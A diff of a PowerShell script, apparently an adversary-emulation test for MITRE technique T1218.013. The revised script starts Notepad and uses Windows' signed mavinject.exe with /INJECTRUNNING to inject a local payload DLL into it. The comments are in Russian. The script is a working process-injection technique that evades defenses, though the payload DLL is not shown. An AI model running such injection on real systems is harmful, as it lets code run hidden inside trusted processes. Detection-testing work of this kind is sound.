@@ -1,24 +1,32 @@
-param (
-    [int]$targetPid,     # Target process ID (renamed from pid to avoid conflict)
-    [string]$dllPath     # Path to the DLL to be injected
-)
+$dllPath = ".\T1218.013_payload.dll"
 
-# Check if the process exists by the target PID
-$process = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
-if (-not $process) {
-    Write-Host "Error: Process with PID $targetPid not found."
-    exit 1
-}
+# Запуск блокнота и получение процесса
+$process = Start-Process -FilePath "notepad.exe" -PassThru
+$targetPid = $process.Id
 
-# Check if the DLL exists
+# Проверка существования DLL
+
 if (-not (Test-Path $dllPath)) {
     Write-Host "Error: DLL file $dllPath not found."
     exit 1
 }
 
-# Execute mavinject to inject the DLL into the target process
-$cmd = "C:\Windows\System32\mavinject.exe $targetPid /INJECTDLL $dllPath"
+# Выполнение mavinject для инжекта DLL в процесс
+$cmd = "C:\Windows\System32\mavinject.exe $targetPid /INJECTRUNNING $dllPath"
 Write-Host "Executing command: $cmd"
-Invoke-Expression $cmd
 
-Write-Host "DLL successfully injected into process $targetPid."
+try {
+    Invoke-Expression $cmd
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "Error: Injection failed with exit code $LASTEXITCODE."
+        exit $LASTEXITCODE
+    } else {
+        Write-Host "DLL successfully injected into Notepad process (PID: $targetPid)."
+    }
+
+} catch {
+    Write-Host "Error: An exception occurred during injection."
+    Write-Host $_.Exception.Message
+    exit 1
+
+}
